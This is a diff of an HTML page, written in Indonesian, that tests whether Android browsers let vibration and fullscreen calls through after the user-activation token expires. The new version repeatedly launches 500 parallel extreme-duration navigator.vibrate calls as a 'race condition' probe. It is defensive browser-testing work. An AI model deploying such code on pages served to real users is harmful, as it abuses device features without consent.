@@ -3,48 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uji Coba Bug: Async Gesture Expiry Bypass</title>
+    <title>Advanced Bug Test: Async Race Condition & Loop</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
             padding: 20px;
-            background-color: #f4f6f9;
-            color: #333;
+            background-color: #121214;
+            color: #e3e3e3;
             text-align: center;
         }
         .container {
-            max-width: 400px;
-            margin: 50px auto;
-            background: white;
+            max-width: 450px;
+            margin: 30px auto;
+            background: #1e1e24;
             padding: 30px;
             border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
         }
         button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 15px 30px;
+            padding: 15px;
             font-size: 16px;
             font-weight: bold;
             border-radius: 8px;
             cursor: pointer;
             width: 100%;
-            transition: background 0.2s;
+            margin-bottom: 10px;
+            border: none;
+            transition: 0.2s;
         }
-        button:hover {
-            background-color: #0056b3;
-        }
+        .btn-start { background-color: #28a745; color: white; }
+        .btn-start:hover { background-color: #218838; }
+        .btn-stop { background-color: #dc3545; color: white; }
+        .btn-stop:hover { background-color: #bd2130; }
         #status-log {
             margin-top: 20px;
             padding: 15px;
-            background: #222;
-            color: #00ff00;
+            background: #000;
+            color: #00ff66;
             font-family: monospace;
             text-align: left;
             border-radius: 6px;
             font-size: 12px;
-            min-height: 100px;
+            min-height: 150px;
+            max-height: 300px;
+            overflow-y: auto;
             white-space: pre-wrap;
         }
     </style>
@@ -52,83 +54,105 @@
 <body>
 
 <div class="container">
-    <h2>Browser Gesture Test</h2>
-    <p>Gunakan tombol di bawah untuk menguji apakah browser Android Anda rentan terhadap <i>Async Expiry Bypass</i>.</p>
+    <h2>Race Condition & Loop Test</h2>
+    <p>Menguji apakah browser Android rentan terhadap pembajakan antrean asinkron (Race Condition) untuk menembus proteksi getar.</p>
     
-    <!-- Tombol Pemicu Utama -->
-    <button id="testBtn">Mulai Pengujian (Klik 1x)</button>
+    <button id="startBtn" class="btn-start">Mulai Race & Loop (Klik 1x)</button>
+    <button id="stopBtn" class="btn-stop">HENTIKAN PENGUJIAN</button>
 
     <h3>Konsol Log Logika:</h3>
-    <div id="status-log">Menunggu klik dari Anda...</div>
+    <div id="status-log">Menunggu instruksi...</div>
 </div>
 
 <script>
     const logBox = document.getElementById('status-log');
-    const testBtn = document.getElementById('testBtn');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
 
-    // Fungsi pembantu untuk mencetak log ke layar HP
+    let isRunning = false;
+    let loopCounter = 0;
+
     function writeLog(text) {
         logBox.innerHTML += "\n> " + text;
+        logBox.scrollTop = logBox.scrollHeight; // Auto scroll ke bawah
         console.log(text);
     }
 
-    // Fungsi simulasi jeda waktu asinkron murni menggunakan Promise
-    function sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
+    // Fungsi delay asinkron
+    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+    // Metode Race Condition: Melepaskan ratusan eksekusi secara paralel untuk membingungkan masa kedaluwarsa token
+    async function triggerRaceCondition() {
+        let promises = [];
+        
+        // Membuat 500 permintaan asinkron secara bersamaan (Kondisi Balapan)
+        for (let i = 0; i < 500; i++) {
+            promises.push((async () => {
+                // Memberikan delay acak kecil agar antrean Microtask menumpuk di memori
+                await sleep(Math.random() * 100); 
+                
+                if (navigator.vibrate) {
+                    // Mencoba menembus batasan durasi dengan angka ekstrem secara simultan
+                    return navigator.vibrate(999999999999999999);
+                }
+                return false;
+            })());
+        }
+
+        // Jalankan semua fungsi secara bersamaan, lihat apakah ada salah satu yang lolos celah
+        const results = await Promise.all(promises);
+        return results.includes(true);
     }
 
-    testBtn.addEventListener('click', async () => {
-        logBox.innerHTML = ""; // Bersihkan log lama
-        writeLog("Tombol diklik. Token 'User Activation' aktif.");
-        writeLog("Memulai jeda asinkron berantai (Total: 6 detik)...");
+    // Fungsi Utama Loop Pengujian
+    async function startTestingLoop() {
+        isRunning = true;
+        loopCounter = 0;
+        logBox.innerHTML = "";
+        writeLog("Aktivasi Awal Terdeteksi. Memulai Loop & Race...");
 
-        // MENYIMPAN STATUS AKTIVASI SEBELUM DELAY (Untuk pengecekan internal)
-        if (navigator.userActivation) {
-            writeLog("Status Aktivasi Awal: " + navigator.userActivation.isActive);
-        }
+        while (isRunning) {
+            loopCounter++;
+            writeLog(`[Siklus #${loopCounter}] Memulai delay 6 detik (Melewati batas 5 detik)...`);
+            
+            // Jeda 6 detik untuk memaksa token aktivasi kedaluwarsa secara teoritis
+            await sleep(6000);
 
-        // Trik Ekstraksi: Melakukan operasi asinkron bertingkat (Nested Promises)
-        // Di sini kita memaksa browser menunggu total 6 detik.
-        // Di browser yang aman, token interaksi HARUSNYA hangus setelah maksimal 5 detik.
-        await sleep(3000);
-        writeLog("...Sudah berjalan 3 detik...");
-        await sleep(3000);
-        writeLog("...Sudah berjalan 6 detik. Delay Selesai.");
-
-        if (navigator.userActivation) {
-            writeLog("Status Aktivasi Sekarang: " + navigator.userActivation.isActive);
-        }
-
-        writeLog("Mencoba mengeksekusi Fullscreen & Getar secara ilegal...");
-
-        // 1. UJI COBA BYPASS FULLSCREEN
-        try {
-            if (document.documentElement.requestFullscreen) {
-                await document.documentElement.requestFullscreen();
-            } else if (document.documentElement.webkitRequestFullscreen) {
-                await document.documentElement.webkitRequestFullscreen();
+            if (navigator.userActivation) {
+                writeLog(`Siklus #${loopCounter} - Status Aktivasi Resmi: ` + navigator.userActivation.isActive);
             }
-            writeLog("🚨 BUG COMFIRMED: Sukses tembus Fullscreen setelah 6 detik!");
-        } catch (err) {
-            writeLog("❌ Fullscreen diblokir (Perilaku Normal).");
-        }
 
-        // 2. UJI COBA BYPASS VIBRATE (GETAR)
-        try {
-            if (navigator.vibrate) {
-                // Mencoba menggetarkan HP selama 2 detik
-                let success = navigator.vibrate(999999999999999999);
-                if (success) {
-                    writeLog("🚨 BUG COMFIRMED: HP Anda bergetar tanpa gesture langsung!");
-                } else {
-                    writeLog("❌ Getar ditolak atau gagal.");
-                }
+            writeLog(`Siklus #${loopCounter} - Meluncurkan Serangan Race Condition...`);
+            
+            // Eksekusi trik race condition
+            let isBypassed = await triggerRaceCondition();
+
+            if (isBypassed) {
+                writeLog(`🚨 BUG CONFIRMED: Getar Ekstrem Tembus di Siklus #${loopCounter}!`);
             } else {
-                writeLog("ℹ️ Browser tidak mendukung API Getar.");
+                writeLog(`❌ Siklus #${loopCounter}: Diblokir browser (Normal).`);
             }
-        } catch (err) {
-            writeLog("❌ Gagal mengeksekusi Getar: " + err.message);
+
+            // Jeda 1 detik sebelum masuk ke perulangan berikutnya agar browser tidak crash total
+            await sleep(1000);
         }
+    }
+
+    // Event Listener Tombol
+    startBtn.addEventListener('click', () => {
+        if (!isRunning) {
+            startTestingLoop();
+        } else {
+            writeLog("Pengujian sedang berjalan...");
+        }
+    });
+
+    stopBtn.addEventListener('click', () => {
+        isRunning = false;
+        if (navigator.vibrate) {
+            navigator.vibrate(0); // Matikan semua getaran aktif jika ada yang tembus
+        }
+        writeLog("🛑 Pengujian dihentikan secara paksa oleh pengguna.");
     });
 </script>
 
